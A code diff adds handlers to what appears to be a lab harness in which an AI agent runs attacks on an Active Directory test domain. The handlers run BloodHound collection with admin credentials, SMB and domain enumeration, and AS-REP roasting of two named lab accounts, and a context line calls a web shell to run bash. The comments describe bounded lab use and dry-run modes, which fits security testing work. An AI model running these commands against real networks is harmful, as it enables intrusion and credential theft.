@@ -882,6 +882,53 @@ echo "banner=$(curl -s "$SHELL_URL?cmd=bash%20-c%20%27(echo%3B%20sleep%202)%20%7
         r = _lab_mcp_call(cmd, timeout=90)  # type: ignore[misc]
         return parse_sandbox_output(r.get("output", ""))[1] or "[exploit: no output]"
 
+    if fn_name == "bloodhound-ce-python":
+        # Read-only AD graph collection, deliberately bounded to DCOnly. `All`
+        # was tested previously but is broader than the emergent recon step
+        # needs. --zip writes only inside the disposable attack sandbox.
+        target = fn_args.get("target", dc)
+        cmd = (
+            f"bloodhound-ce-python -u administrator -p '{_LAB_ADMIN_PASS}'"
+            f" -d {_LAB_DOMAIN} -dc {_LAB_DOMAIN} --auth-method ntlm"
+            f" -c DCOnly --zip -ns {target} --output /tmp/portal5-bh"
+            f" 2>&1 | tail -25"
+        )
+        if dry_run:
+            return f"[DRY-RUN] BloodHound DC-only collection against {target}"
+        r = _lab_mcp_call(cmd, timeout=120)  # type: ignore[misc]
+        return parse_sandbox_output(r.get("output", ""))[1] or "[bloodhound: no output]"
+
+    if fn_name == "enum4linux-ng":
+        target = fn_args.get("target", dc)
+        cmd = f"enum4linux-ng -A {target} 2>&1 | head -100"
+        if dry_run:
+            return f"[DRY-RUN] enum4linux-ng full enumeration against {target}"
+        r = _lab_mcp_call(cmd, timeout=90)  # type: ignore[misc]
+        return parse_sandbox_output(r.get("output", ""))[1] or "[enum4linux-ng: no output]"
+
+    if fn_name == "nxc":
+        target = fn_args.get("target", dc)
+        cmd = f"nxc smb {target} -u '' -p '' --shares 2>&1 | head -30"
+        if dry_run:
+            return f"[DRY-RUN] anonymous NetExec SMB share enumeration against {target}"
+        r = _lab_mcp_call(cmd, timeout=60)  # type: ignore[misc]
+        return parse_sandbox_output(r.get("output", ""))[1] or "[nxc: no output]"
+
+    if fn_name == "impacket-GetNPUsers":
+        target = fn_args.get("target", dc)
+        # Bounded to the two known AS-REP-roastable lab accounts rather than
+        # accepting an arbitrary users file or spraying the directory.
+        cmd = (
+            "printf 'arya.stark\\nned.stark\\n' > /tmp/portal5-asrep-users.txt && "
+            f"impacket-GetNPUsers {_LAB_DOMAIN}/"
+            " -usersfile /tmp/portal5-asrep-users.txt"
+            f" -dc-ip {target} -no-pass 2>&1 | head -30"
+        )
+        if dry_run:
+            return f"[DRY-RUN] bounded AS-REP user check against {target}"
+        r = _lab_mcp_call(cmd, timeout=60)  # type: ignore[misc]
+        return parse_sandbox_output(r.get("output", ""))[1] or "[GetNPUsers: no output]"
+
     if fn_name == "establish_persistence":
         method = fn_args.get("method", "scheduled_task")
         # Found live 2026-07-05: this used to gate the REAL command behind a
